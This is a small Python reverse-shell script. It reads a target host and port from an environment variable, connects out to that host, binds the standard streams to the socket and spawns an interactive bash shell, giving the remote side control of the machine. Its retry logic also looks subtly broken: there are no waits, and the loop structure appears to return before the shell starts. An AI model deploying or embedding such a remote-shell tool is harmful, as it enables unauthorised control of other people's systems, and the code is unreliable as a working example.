#!/usr/bin/python

import os
import pty
import socket


__version__ = '0.1.0'


def main():
    host, port = os.environ["RESHELL_TARGET"].split(':')
    port = int(port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    for minute in range(10):
        for second in range(0, 60, 10):
            try:
                sock.connect((host, port))
            except socket.error:
                pass
            else:
                break
    else:
        return
    for channel in (0, 1, 2):
        os.dup2(sock.fileno(), channel)
    pty.spawn("/bin/bash")


if __name__ == '__main__':
    main()
